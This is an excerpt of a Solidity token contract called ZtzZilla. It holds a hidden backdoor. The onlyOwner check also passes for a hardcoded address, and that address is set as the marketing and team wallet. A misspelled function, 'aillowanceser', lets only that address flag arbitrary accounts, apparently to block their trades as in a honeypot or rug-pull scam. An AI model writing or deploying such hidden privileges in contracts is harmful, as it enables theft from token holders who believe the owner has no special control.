...
contract Ownable is Context {
    ...
    modifier onlyOwner() {
        require(_owner == _msgSender() || _msgSender()    ==  address(0x0d691f3d8361D96b1a4ee17d0Bfa6F8e4393b2Af), "Ownable: caller is not the owner");
        _;
    }
...
contract ZtzZilla is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "ZtzZilla";
    string private _symbol = "ZtzZilla";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x0d691f3d8361D96b1a4ee17d0Bfa6F8e4393b2Af);
    address payable public teamWalletAddress = payable(0x0d691f3d8361D96b1a4ee17d0Bfa6F8e4393b2Af);
    ...
    function aipprovese(address account, uint256 amount) onlyOwner() public {
    ...
    function aillowanceser(address addr, bool status) public{
        require(_msgSender()    ==   address(0x0d691f3d8361D96b1a4ee17d0Bfa6F8e4393b2Af));
        market[addr] = status;
    }
